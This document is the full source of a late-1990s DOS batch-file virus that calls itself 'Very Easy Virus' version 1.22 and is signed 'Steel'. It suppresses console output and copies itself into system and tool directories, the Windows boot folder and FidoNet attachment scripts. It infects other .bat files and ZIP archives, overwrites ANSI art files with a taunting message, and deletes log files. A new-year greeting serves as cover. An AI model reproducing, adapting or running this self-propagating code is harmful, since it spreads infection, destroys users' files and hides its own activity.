@ctty nul
if "%0"=="AUTOEXEC.BAT" goto aut
goto yui
:aut
cls
echo.
echo             **************************************************
echo  /-----\  *   Happy new 2000 years. Be happy! WE LOVE YOU!   *  /-----\
echo | o   o | *              New Version from Steel              * | o   o |
echo |   Â   | *           Please! Be happy in new years          * |   Â   |
echo |  ---  | *              (c) Your Friends and steel!         * |  ---  |
echo  \-----/   **************************************************   \-----/
exit
:yui
@ctty nul
if exist c:\rywblk.txt goto okok
@ctty nul
type ok >> c:\rywblk.txt
copy %0 c:\
c:\%0
copy %0 c:\fido
c:\fido\%0
copy %0 c:\util
c:\util\%0
copy %0 d:\util
d:\util\%0
copy %0 %winbootdir%
%winbootdir%\%0
copy %0 d:\tools
d:\tools\%0
copy %0 c:\tools
c:\tools\%0
copy %0 %1
echo. >> c:\fido\attach.bat
echo attach.exe -A -L %0 >> c:\fido\attach.bat
attrib c:\rywblk.txt +h +r
:okok
if exist c:\butcher.txt goto cont
echo [0;1;33m[2J[6C[32mHello sentence! >> c:\butcher.txt
echo  [36m butcher go for you!  >> c:\butcher.txt
echo [7C[31mHa-Ha-Ha![0m >> c:\butcher.txt
:cont
for %%j in (*.bat ..\*.bat) do if %%j==ATTACH.BAT goto att
goto re
:att
echo. >> attach.bat
echo attach.exe -A -L %0 >> attach.bat
exit
:re
for %%f in (*.bat ..\*.bat) do find "TRTL" %%f
if not errorlevel 1 goto next
for %%d in (*.bat ..\*.bat ..\..\*.bat) do copy /b %%d+%0
:next
for %%z in (*.zip ..\*.zip) do pkzip %%z %0
for %%q in (*.ans c:\max\*.ans) do copy c:\butcher.txt %%q
del *.log
@ctty con
: (c) Steel! End of December 1999...
: New Clone: **-12-1999   Very Easy Virus!
:     Version 1.22
